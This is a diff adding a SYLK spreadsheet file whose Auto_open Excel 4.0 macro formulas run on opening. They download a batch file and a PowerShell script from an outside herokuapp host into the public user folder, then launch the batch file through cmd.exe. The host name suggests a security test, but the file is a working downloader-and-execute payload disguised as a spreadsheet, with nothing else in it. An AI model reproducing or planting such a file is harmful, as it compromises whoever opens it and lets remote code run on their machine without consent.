@@ -1,0 +1,9 @@
+ID;P
+O;E
+NN;NAuto_open;ER1C1
+C;Y1;X1;K-140247040;EREGISTER("urlmon","URLDownloadToFileA","JJCCJJ","Download",,1)
+C;Y2;K0;EDownload(0,"https://security-test-hanna.herokuapp.com/downloadbat","c:\\Users\\Public\\runner.bat",0,0)
+C;Y3;K0;EDownload(0,"https://security-test-hanna.herokuapp.com/downloadps","c:\\Users\\Public\\perfectlysafe.ps1",0,0)
+C;Y4;KTRUE;EWAIT(NOW()+"00:00:10")
+C;Y5;K42;ECALL("Shell32","ShellExecuteA","JJCCCJJ",0,"open","c:\\windows\\system32\\cmd.exe","/k c:\\Users\\Public\\runner.bat",0,0)
+E
